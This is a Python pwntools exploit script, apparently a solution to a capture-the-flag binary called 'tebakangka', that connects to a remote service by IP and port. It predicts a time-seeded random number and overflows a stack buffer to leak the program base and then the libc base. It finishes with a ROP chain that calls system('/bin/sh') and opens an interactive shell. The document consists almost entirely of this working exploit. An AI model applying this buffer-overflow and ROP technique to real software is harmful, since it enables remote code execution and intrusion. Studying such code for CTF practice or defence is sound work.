from pwn import *
from ctypes import CDLL

exe = ELF("tebakangka_patched")
libc = ELF("./libc.so.6")
libr = CDLL("./libc.so.6")
ld = ELF("./ld-2.35.so")
context.encoding = 'latin'
context.log_level = 'INFO'
context.terminal = ['tmux', 'splitw', '-h']
warnings.simplefilter("ignore")

remote_url = "206.189.32.77"
remote_port = 9502
gdbscript = '''
init-pwndbg
'''

def funny_random(eax):
    edx = eax
    
    eax = edx
    eax <<= 3
    eax &= 0xFFFFFFFFFFFFFFFF
    
    eax += edx
    eax &= 0xFFFFFFFFFFFFFFFF
    
    if eax & 0x80000000:
        rdx = (eax | ~0xFFFFFFFF)
    else:
        rdx = eax & 0xFFFFFFFF
    rdx &= 0xFFFFFFFFFFFFFFFF
    
    rdx *= -0x6c503075
    rdx &= 0xFFFFFFFFFFFFFFFF
    
    rdx >>= 32
    
    edx = rdx & 0xFFFFFFFF
    edx += eax
    edx &= 0xFFFFFFFF
    
    if edx & 0x80000000:
        edx = (edx >> 11) | 0xFFF80000
    else:
        edx >>= 11
    
    ecx = eax
    if ecx & 0x80000000:
        ecx = 0xFFFFFFFF
    else:
        ecx = 0x0
    
    edx -= ecx
    
    ecx = edx
    ecx *= 0xdde
    ecx &= 0xFFFFFFFF
    
    eax -= ecx
    eax = (eax + 2**32) % 2**32
    
    edx = eax
    eax = edx
    
    return eax

def conn():
    if args.LOCAL:
        r = process([exe.path])
        context.log_level = 'DEBUG'
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()

r.sendlineafter(b':', b'1')

# agak2 nge brute, rng nya juga ðŸ’€
libr.srand(libr.time(0))
random = funny_random(libr.rand())
sleep(0.1)
r.sendlineafter(b':', str(random).encode())

# jump sambil nge leak
off = 264
payload = cyclic(off)
payload += b'\xb4'

# get elf base
r.sendafter(b'?', payload)
leak = r.recvuntil(b'...', drop=True)
leak = u64(leak[-6:].ljust(8, b'\x00'))
info(f'Leak: {hex(leak)}')
exe.address = leak - 0x15b4
info(f'Base: {hex(exe.address)}')

# call plt.puts, ret to vuln
vuln = exe.address + 0x1458
payload = cyclic(off)
payload += p64(exe.plt['puts'])
payload += p64(vuln)
r.sendafter(b'?', payload)

# funlockfile leak
r.recvuntil(b'makanmu\n')
libc.address = u64(r.recvline().strip().ljust(8, b'\x00')) - libc.sym['funlockfile']
info(f'Libc: {hex(libc.address)}')

# call system
pop_rdi = 0x000000000002a3e5 + libc.address
bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']
ret = 0x0000000000029cd6 + libc.address

payload = cyclic(off)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

r.sendafter(b'?', payload)

r.interactive()